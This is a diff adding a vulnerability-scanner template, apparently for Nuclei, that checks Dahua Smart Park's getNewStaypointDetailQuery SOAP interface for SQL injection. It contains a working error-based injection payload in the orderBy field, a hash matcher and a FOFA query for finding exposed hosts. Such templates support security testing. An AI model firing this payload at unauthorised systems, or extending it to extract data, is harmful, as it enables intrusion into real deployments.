@@ -1,0 +1,46 @@
+id: dahua-smart-park-getnewstaypointdetailquery-sqli
+
+info:
+  name: Dahua Smart Park getNewStaypointDetailQuery - SQL Injection
+  author: qwtd
+  severity: high
+  description: Dahua Smart Park getNewStaypointDetailQuery interface SQL injection vulnerability through SOAP request.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BAgetNewStaypointDetailQuery%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="dahua-智慧园区综合管理平台"
+  tags: 大华智慧园区管理系统
+
+http:
+  - raw:
+      - |
+        POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 491
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <car:getNewStaypointDetailQuery>
+        <!--type: string-->
+        <searchJson>{}</searchJson>
+        <!--type: string-->
+        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,md5(999999999),0x7e),1)--"}</pageJson>
+        <!--type: string-->
+        <extend>quae divum incedo</extend>
+        </car:getNewStaypointDetailQuery>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c8c605999f3d8352d7bb792cf3fdb25"
+
+      - type: status
+        status:
+          - 200
